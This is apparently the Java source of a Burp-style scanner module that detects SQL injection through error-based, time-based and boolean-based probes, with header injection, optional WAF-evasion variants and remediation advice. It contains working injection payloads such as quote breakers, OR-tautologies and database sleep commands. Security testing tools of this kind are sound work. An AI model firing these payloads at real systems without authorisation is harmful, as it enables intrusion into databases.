package com.burpmax.active;


import java.util.*;
import com.burpmax.active.ConfirmationEngine;
import java.util.regex.*;
import static com.burpmax.model.Finding.*;

/**
 * SQL Injection probe — three detection strategies:
 *
 *  1. Error-based   : inject syntax-breaking payloads, detect DB error strings in response
 *  2. Time-based blind : inject sleep commands, measure response time delta vs baseline
 *  3. Boolean-based blind : inject true/false conditions, compare response body length
 *
 * Header injection is also tested (User-Agent, Referer, X-Forwarded-For)
 * because these are commonly concatenated into queries without sanitisation.
 */
public class SqliProbe {

    // ── DB error fingerprints ─────────────────────────────────────────────────
    private static final List<Pattern> DB_ERROR_PATTERNS = List.of(
        Pattern.compile("you have an error in your sql syntax",           Pattern.CASE_INSENSITIVE),
        Pattern.compile("warning:\\s*mysql",                              Pattern.CASE_INSENSITIVE),
        Pattern.compile("unclosed quotation mark after the character string", Pattern.CASE_INSENSITIVE),
        Pattern.compile("quoted string not properly terminated",          Pattern.CASE_INSENSITIVE),
        Pattern.compile("ORA-\\d{5}",                                    Pattern.CASE_INSENSITIVE),
        Pattern.compile("Microsoft OLE DB Provider for SQL Server",      Pattern.CASE_INSENSITIVE),
        Pattern.compile("pg_query\\(\\).*ERROR",                         Pattern.CASE_INSENSITIVE),
        Pattern.compile("PSQLException",                                 Pattern.CASE_INSENSITIVE),
        Pattern.compile("SQLiteException",                               Pattern.CASE_INSENSITIVE),
        Pattern.compile("syntax error.*sqlite",                          Pattern.CASE_INSENSITIVE),
        Pattern.compile("com\\.mysql\\.jdbc",                            Pattern.CASE_INSENSITIVE),
        Pattern.compile("org\\.hibernate\\.exception",                   Pattern.CASE_INSENSITIVE),
        Pattern.compile("SQLSTATE\\[",                                   Pattern.CASE_INSENSITIVE),
        Pattern.compile("javax\\.persistence\\.PersistenceException",    Pattern.CASE_INSENSITIVE),
        Pattern.compile("Incorrect syntax near",                         Pattern.CASE_INSENSITIVE),
        Pattern.compile("server error in .* application",                Pattern.CASE_INSENSITIVE)
    );

    // ── Error-based payloads ──────────────────────────────────────────────────
    private static final List<String> ERROR_PAYLOADS = List.of(
        "'",
        "''",
        "1'",
        "' OR '1'='1",
        "' --",
        "1--",
        "\""
    );

    // ── Time-based blind payloads: [payload, DB type] ───────────────────────
    // Use unique sleep durations to distinguish from slow legitimate responses
    private static final int SLEEP_SECONDS = 3;
    private static final List<String[]> TIME_PAYLOADS = List.of(
        new String[]{"'; WAITFOR DELAY '0:0:" + SLEEP_SECONDS + "'--",    "SQL Server"},
        new String[]{"1; WAITFOR DELAY '0:0:" + SLEEP_SECONDS + "'--",    "SQL Server"},
        new String[]{"'; SELECT SLEEP(" + SLEEP_SECONDS + ")--",           "MySQL"},
        new String[]{"1'; SELECT SLEEP(" + SLEEP_SECONDS + ")--",          "MySQL"},
        new String[]{"'; SELECT pg_sleep(" + SLEEP_SECONDS + ")--",        "PostgreSQL"},
        new String[]{"1 AND (SELECT * FROM (SELECT(SLEEP(" + SLEEP_SECONDS + ")))a)--", "MySQL"},
        new String[]{"'; BEGIN DBMS_SESSION.SLEEP(" + SLEEP_SECONDS + "); END;--", "Oracle"},
        new String[]{"'; BEGIN DBMS_LOCK.SLEEP(" + SLEEP_SECONDS + "); END;--",    "Oracle (legacy)"}
    );

    // ── Boolean-based blind payloads: [true, false] pairs ───────────────────
    private static final List<String[]> BOOL_PAYLOAD_PAIRS = List.of(
        new String[]{"' AND '1'='1",    "' AND '1'='2"},
        new String[]{"1 AND 1=1",       "1 AND 1=2"},
        new String[]{"' AND 1=1--",     "' AND 1=2--"}
    );

    // ── Injectable HTTP headers ───────────────────────────────────────────────
    private static final List<String> INJECTABLE_HEADERS = List.of(
        "User-Agent", "Referer", "X-Forwarded-For",
        "X-Forwarded-Host", "X-Real-IP", "Client-IP"
    );

    // ── Timing thresholds ────────────────────────────────────────────────────
    // Response must be at least (SLEEP_SECONDS - 1) seconds slower than baseline
    private static final long TIME_THRESHOLD_MS = (SLEEP_SECONDS - 1) * 1000L;
    // If baseline itself is slow, skip time-based for this endpoint
    private static final long MAX_BASELINE_MS   = 3000L;

    // ── Main entry point ──────────────────────────────────────────────────────
    public static List<ActiveScanResult> probe(ProbeContext ctx,
                                               RequestBuilder rb,
                                               HttpSender sender) {
        return probe(ctx, rb, sender, true);
    }

    /** Tier 3: error-based and boolean-based only — fast, no sleep. */
    public static List<ActiveScanResult> probeErrorBased(ProbeContext ctx,
                                                          RequestBuilder rb,
                                                          HttpSender sender) {
        List<ActiveScanResult> results = new ArrayList<>();
        Set<String> firedParams = new HashSet<>();
        for (String param : ctx.allParamNames()) {
            if (firedParams.contains(param)) continue;
            ActiveScanResult r = probeErrorBased(ctx, rb, sender, param, null, null, true);
            if (r != null) { results.add(r); firedParams.add(param); }
        }
        for (String header : INJECTABLE_HEADERS) {
            String key = "header:" + header;
            if (firedParams.contains(key)) continue;
            ActiveScanResult r = probeErrorBased(ctx, rb, sender, null, header, null, true);
            if (r != null) { results.add(r); firedParams.add(key); }
        }
        long baselineMs = measureBaseline(ctx, sender);
        for (String param : ctx.allParamNames()) {
            if (firedParams.contains(param)) continue;
            ActiveScanResult r = probeBooleanBased(ctx, rb, sender, param, baselineMs);
            if (r != null) { results.add(r); firedParams.add(param); }
        }
        return results;
    }

    /** Tier 4: time-based blind only — always slow, always last. */
    public static List<ActiveScanResult> probeTimeBased(ProbeContext ctx,
                                                         RequestBuilder rb,
                                                         HttpSender sender) {
        List<ActiveScanResult> results = new ArrayList<>();
        Set<String> firedParams = new HashSet<>();
        long baselineMs = measureBaseline(ctx, sender);
        if (baselineMs < 0 || baselineMs >= MAX_BASELINE_MS) return results;
        for (String param : ctx.allParamNames()) {
            if (firedParams.contains(param)) continue;
            ActiveScanResult r = probeTimeBased(ctx, rb, sender, param, null, baselineMs, true);
            if (r != null) { results.add(r); firedParams.add(param); }
        }
        for (String header : INJECTABLE_HEADERS) {
            String key = "header:" + header;
            if (firedParams.contains(key)) continue;
            ActiveScanResult r = probeTimeBased(ctx, rb, sender, null, header, baselineMs, true);
            if (r != null) { results.add(r); firedParams.add(key); }
        }
        return results;
    }

    public static List<ActiveScanResult> probe(ProbeContext ctx,
                                               RequestBuilder rb,
                                               HttpSender sender,
                                               boolean wafEvasion) {
        List<ActiveScanResult> results = new ArrayList<>();
        Set<String> firedParams = new HashSet<>();

        // ── 1. Error-based (parameters) ────────────────────────────────────
        for (String param : ctx.allParamNames()) {
            if (firedParams.contains(param)) continue;
            ActiveScanResult r = probeErrorBased(ctx, rb, sender, param, null, null, wafEvasion);
            if (r != null) { results.add(r); firedParams.add(param); }
        }

        // ── 2. Error-based (HTTP headers) ──────────────────────────────────
        for (String header : INJECTABLE_HEADERS) {
            String key = "header:" + header;
            if (firedParams.contains(key)) continue;
            ActiveScanResult r = probeErrorBased(ctx, rb, sender, null, header, null, wafEvasion);
            if (r != null) { results.add(r); firedParams.add(key); }
        }

        // ── 3. Time-based blind (parameters) ─────────────────────────────
        // Only run if no error-based findings yet (saves requests on vulnerable endpoints)
        // and only if baseline response time is fast enough to be meaningful
        long baselineMs = measureBaseline(ctx, sender);
        if (baselineMs >= 0 && baselineMs < MAX_BASELINE_MS) {
            for (String param : ctx.allParamNames()) {
                if (firedParams.contains(param)) continue;
                ActiveScanResult r = probeTimeBased(ctx, rb, sender, param, null, baselineMs, wafEvasion);
                if (r != null) { results.add(r); firedParams.add(param); }
            }

            // Time-based headers (most valuable for WAF-protected endpoints)
            for (String header : INJECTABLE_HEADERS) {
                String key = "header:" + header;
                if (firedParams.contains(key)) continue;
                ActiveScanResult r = probeTimeBased(ctx, rb, sender, null, header, baselineMs, wafEvasion);
                if (r != null) { results.add(r); firedParams.add(key); }
            }
        }

        // ── 4. Boolean-based blind (parameters only, when nothing found yet) ─
        for (String param : ctx.allParamNames()) {
            if (firedParams.contains(param)) continue;
            ActiveScanResult r = probeBooleanBased(ctx, rb, sender, param, baselineMs);
            if (r != null) { results.add(r); firedParams.add(param); }
        }

        return results;
    }

    // ── Error-based detection ─────────────────────────────────────────────────
    private static ActiveScanResult probeErrorBased(ProbeContext ctx, RequestBuilder rb,
                                                     HttpSender sender,
                                                     String param, String header,
                                                     String originalValue, boolean wafEvasion) {
        List<String> errorPayloads = new ArrayList<>(ERROR_PAYLOADS);
        if (wafEvasion) {
            List<String> expanded = new ArrayList<>();
            for (String p : ERROR_PAYLOADS) {
                expanded.addAll(WafEvasionEncoder.sqlVariants(p));
            }
            errorPayloads = expanded;
        }
        for (String payload : errorPayloads) {
            byte[] probeReq = buildRequest(ctx, rb, param, header, payload);
            if (probeReq == null) continue;

            HttpSender.Response resp = sender.send(ctx.service, probeReq);
            if (resp == null) continue;

            String body = resp.body() + " " + resp.headers();
            for (Pattern pat : DB_ERROR_PATTERNS) {
                Matcher m = pat.matcher(body);
                if (m.find()) {
                    // Confirm: error is reproducible AND absent from clean baseline
                    if (!ConfirmationEngine.confirmError(sender, ctx.service,
                            probeReq, ctx.originalRequest, pat)) continue;

                    String matchedError = m.group();
                    String where = header != null ? "header '" + header + "'" : "parameter '" + param + "'";
                    return new ActiveScanResult(
                        "SQL Injection (Error-Based)", SEV_CRITICAL,
                        "Error-based SQL injection was confirmed on " + where + ". " +
                        "The payload '" + payload + "' caused a database error to appear in the response, " +
                        "confirming unsanitised user input is interpolated into a SQL query. " +
                        "The error was reproducible and absent from the clean baseline request. " +
                        "An attacker can extract all database contents, bypass authentication, and " +
                        "potentially execute OS commands (xp_cmdshell, INTO OUTFILE, etc.).",
                        "Injection point: " + where + " | Payload: " + payload +
                        " | DB Error: " + trunc(matchedError, 100),
                        SQLI_REMEDIATION, "CWE-89",
                        ctx.url, param != null ? param : header, payload,
                        trunc(new String(probeReq), 300), trunc(body, 200),
                        probeReq, resp.raw(), -1L);
                }
            }
        }
        return null;
    }

    // ── Time-based blind detection ────────────────────────────────────────────
    private static ActiveScanResult probeTimeBased(ProbeContext ctx, RequestBuilder rb,
                                                    HttpSender sender,
                                                    String param, String header,
                                                    long baselineMs, boolean wafEvasion) {
        List<String[]> timePayloads = new ArrayList<>(TIME_PAYLOADS);
        if (wafEvasion) {
            List<String[]> expanded = new ArrayList<>();
            for (String[] tp : TIME_PAYLOADS) {
                for (String variant : WafEvasionEncoder.sqlVariants(tp[0])) {
                    expanded.add(new String[]{variant, tp[1] + " (WAF-evade)"});
                }
            }
            timePayloads = expanded;
        }
        for (String[] tp : timePayloads) {
            String payload = tp[0];
            String dbType  = tp[1];

            byte[] probeReq = buildRequest(ctx, rb, param, header, payload);
            if (probeReq == null) continue;

            long start = System.currentTimeMillis();
            HttpSender.Response resp = sender.send(ctx.service, probeReq);
            long elapsed = System.currentTimeMillis() - start;

            if (resp == null) continue;

            long delta = elapsed - baselineMs;
            if (delta >= TIME_THRESHOLD_MS) {
                // Confirm: re-send sleep payload (must be slow again) and
                // original (must be fast) using absolute thresholds
                if (!ConfirmationEngine.confirmTimeBased(sender, ctx.service,
                        probeReq, ctx.originalRequest, TIME_THRESHOLD_MS, baselineMs)) continue;

                String where = header != null ? "header '" + header + "'" : "parameter '" + param + "'";
                return new ActiveScanResult(
                        "SQL Injection (Time-Based Blind)", SEV_CRITICAL,
                        "Time-based blind SQL injection was confirmed on " + where + " against a " +
                        dbType + " database. The payload caused the database to sleep for " +
                        SLEEP_SECONDS + " seconds (measured: " + (elapsed/1000) + "s vs baseline: " +
                        (baselineMs/1000) + "s). The delay was reproduced on a second probe and " +
                        "the clean baseline was fast, ruling out network jitter.",
                        "Injection point: " + where + " | Payload: " + trunc(payload, 80) +
                        " | Response time: " + elapsed + "ms | Baseline: " + baselineMs + "ms" +
                        " | Delta: " + delta + "ms | DB: " + dbType,
                        SQLI_REMEDIATION, "CWE-89",
                        ctx.url, param != null ? param : header, payload,
                        trunc(new String(probeReq), 300),
                        "Response delayed " + elapsed + "ms (baseline: " + baselineMs + "ms)",
                        probeReq, resp.raw(), elapsed);
            }
        }
        return null;
    }

    // ── Boolean-based blind detection ────────────────────────────────────────
    private static ActiveScanResult probeBooleanBased(ProbeContext ctx, RequestBuilder rb,
                                                       HttpSender sender,
                                                       String param, long baselineMs) {
        // Get baseline body length
        HttpSender.Response baseline = sender.send(ctx.service, ctx.originalRequest);
        if (baseline == null) return null;
        int baseLen = baseline.body().length();
        if (baseLen == 0) return null;

        for (String[] pair : BOOL_PAYLOAD_PAIRS) {
            String truePayload  = pair[0];
            String falsePayload = pair[1];

            byte[] trueReq  = buildRequest(ctx, rb, param, null, truePayload);
            byte[] falseReq = buildRequest(ctx, rb, param, null, falsePayload);
            if (trueReq == null || falseReq == null) continue;

            HttpSender.Response trueResp  = sender.send(ctx.service, trueReq);
            HttpSender.Response falseResp = sender.send(ctx.service, falseReq);
            if (trueResp == null || falseResp == null) continue;

            int trueLen  = trueResp.body().length();
            int falseLen = falseResp.body().length();

            // Boolean injection confirmed when:
            // - true condition produces similar response to baseline
            // - false condition produces meaningfully different response
            boolean trueSimilarToBase  = similarity(baseLen, trueLen) > 0.85;
            boolean falseDiffFromBase  = similarity(baseLen, falseLen) < 0.70;
            boolean trueDiffFromFalse  = similarity(trueLen, falseLen) < 0.70;

            if (trueSimilarToBase && falseDiffFromBase && trueDiffFromFalse) {
                // Confirm: run both probes a second time to rule out A/B testing
                if (!ConfirmationEngine.confirmDifferential(sender, ctx.service,
                        trueReq, falseReq, trueLen, falseLen, baseLen, 0.30)) continue;

                return new ActiveScanResult(
                    "SQL Injection (Boolean-Based Blind)", SEV_CRITICAL,
                    "Boolean-based blind SQL injection was detected on parameter '" + param + "'. " +
                    "The true condition '" + truePayload + "' returned a response similar to the " +
                    "baseline (" + baseLen + " bytes), while the false condition '" + falsePayload +
                    "' returned a significantly different response (" + falseLen + " bytes). " +
                    "An attacker can exploit this to extract all database contents character by character.",
                    "True payload: " + truePayload + " → " + trueLen + " bytes | " +
                    "False payload: " + falsePayload + " → " + falseLen + " bytes | " +
                    "Baseline: " + baseLen + " bytes",
                    SQLI_REMEDIATION, "CWE-89",
                    ctx.url, param, truePayload + " / " + falsePayload,
                    trunc(new String(trueReq), 300),
                    "True=" + trueLen + "b, False=" + falseLen + "b, Baseline=" + baseLen + "b",
                    trueReq, trueResp.raw(), -1L);
            }
        }
        return null;
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    /** Build request injecting into a parameter or a header. */
    private static byte[] buildRequest(ProbeContext ctx, RequestBuilder rb,
                                        String param, String header, String payload) {
        if (param != null) return rb.buildProbeRequest(ctx, param, payload);
        if (header != null) return rb.injectHeader(ctx.originalRequest, header, payload);
        return null;
    }

    /** Measure baseline response time. Returns -1 on failure. */
    private static long measureBaseline(ProbeContext ctx, HttpSender sender) {
        long start = System.currentTimeMillis();
        HttpSender.Response r = sender.send(ctx.service, ctx.originalRequest);
        return r != null ? System.currentTimeMillis() - start : -1;
    }

    private static double similarity(int a, int b) {
        if (a == 0 && b == 0) return 1.0;
        if (a == 0 || b == 0) return 0.0;
        return (double) Math.min(a, b) / Math.max(a, b);
    }

    private static String trunc(String s, int n) {
        return s == null ? "" : s.length() > n ? s.substring(0, n) + "..." : s;
    }

    private static final String SQLI_REMEDIATION =
        "PRIMARY FIX \u2014 Parameterised Queries:\n" +
        "Use prepared statements in every database call. This is the only reliable defence.\n" +
        "ORMs (Hibernate, SQLAlchemy, ActiveRecord) use parameterisation by default but can\n" +
        "be bypassed with raw query methods \u2014 audit all uses of createNativeQuery(), raw(),\n" +
        "execute(), or query() that accept user-controlled strings.\n\n" +
        "SECONDARY CONTROLS:\n" +
        "- Least privilege: the DB account must have only the permissions it needs (SELECT,\n" +
        "  INSERT, UPDATE on required tables only). Never use DBA/root for application queries.\n" +
        "- Input validation: enforce type, length and format before data reaches the DB layer;\n" +
        "  reject anything outside the expected pattern as defence-in-depth.\n" +
        "- Error handling: never return raw database errors to the client \u2014 they expose schema,\n" +
        "  version, and query structure. Log errors server-side only.\n" +
        "- WAF: rules that detect SQL metacharacters are useful as defence-in-depth but are\n" +
        "  bypassable and must never replace parameterisation.\n" +
        "- Stored procedures do NOT prevent SQLi unless the procedure itself uses parameterisation\n" +
        "  internally \u2014 dynamic SQL inside a stored proc is equally vulnerable.";
}
